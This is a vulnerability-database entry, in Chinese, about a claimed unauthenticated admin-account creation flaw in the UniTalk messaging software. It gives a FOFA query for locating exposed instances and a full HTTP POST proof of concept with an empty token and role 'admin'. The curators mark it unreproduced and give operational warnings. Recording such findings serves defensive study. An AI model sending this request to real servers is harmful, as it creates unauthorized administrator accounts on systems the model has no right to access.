---
source: "wy876 漏洞文库"
title: "UniTalk 无凭据创建admin用户声称"
product: "UniTalk"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知"
prerequisites: "token空字符串"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/liqozczwz3ct02br"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/UniTalk/unitalk%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "title=\"unitalk\""
fofa_unverified: "title="
id: "vw-1aba618da08eaead8bb3a831"
entity_id: "ve-1aba618da08eaead8bb3a831"
schema_version: "1"
---

# UniTalk 无凭据创建admin用户声称

## 条目说明

- 对象与具体问题：UniTalk；无凭据创建admin用户声称
- 版本、配置及部署条件：版本未知
- 认证与权限前提：token空字符串
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有add请求，无成功响应、后续登录/角色验证；不能据role admin参数即确认授权生效
- 与其他用户API同产品族但独立无需列表前置，勿吞并
- 创建持久管理员账户有明显状态变更，应标高风险复现
- Host空且Content-Length需重算；缺厂商/补丁

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
unitalk是一款即时通讯软件，unitalk存在任意用户添加漏洞

## 二、影响版本
+ unitalk

## 三、资产测绘
+ fofa`title="unitalk"`
+ 特征


## 四、漏洞复现
```http
POST /unitalk/v1.0/user/add.json HTTP/1.1
Host: 
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

{"name":"admin123","role":"admin","pwd":"admin123","token":""}
```

> 请求长度说明：原资料 Content-Length 为 62；静态长度已移除，应由客户端根据最终请求体的字节数生成。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/liqozczwz3ct02br>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
